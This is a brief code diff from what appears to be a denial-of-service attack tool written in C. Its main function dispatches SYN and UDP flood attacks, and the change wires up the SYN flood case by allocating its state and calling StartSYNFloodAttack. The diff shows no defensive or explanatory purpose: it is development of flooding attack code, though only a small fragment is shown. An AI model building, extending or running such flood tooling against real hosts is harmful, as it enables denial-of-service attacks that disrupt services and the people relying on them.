@@ -85,6 +85,9 @@ int main(int argc, char *argv[])
 
         case SYN_FLOOD_ATTACK:
             /* start syn flood thread */
+            parameter->_syn_flood_st = (pSynFloodSt)malloc(sizeof(SynFloodSt));
+
+            StartSYNFloodAttack(parameter);
             break;
 
         case UDP_FLOOD_ATTACK:
